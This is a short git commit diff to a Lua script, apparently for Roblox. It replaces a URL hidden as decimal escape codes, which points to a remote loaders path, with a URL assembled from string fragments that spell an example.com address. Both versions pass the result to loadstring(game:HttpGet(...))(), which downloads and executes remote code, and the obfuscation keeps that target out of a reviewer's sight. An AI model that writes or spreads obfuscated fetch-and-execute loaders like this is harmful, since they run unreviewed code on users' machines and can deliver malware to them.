ef36e8e35b319c4f2410079057cfedbabb0c48fa
1kukukeke12-oss <1kukukeke12@gmail.com>
2026-05-26 22:51:11 -0400

    Update script.lua

--- script.lua
+++ script.lua
@@ -1,6 +1,10 @@
-local a = "\104\116\116\112\115\58\47\47\101\116\101\114\110\97\108\45\100\97\114\107\110\101\115\115\46\111\114\103"
-local b = "/loaders/"
-local c = "0b7ba986a78f1c61156d36ff9efaaa0a"
-local d = ".lua"
+local function build(t)
+    local o = ""
+    for i = 1, #t do
+        o = o .. t[i]
+    end
+    return o
+end
 
-loadstring(game:HttpGet(a .. b .. c .. d))()
+local url = build({"ht","tps","://ex","ample",".com/"})
+loadstring(game:HttpGet(url))()
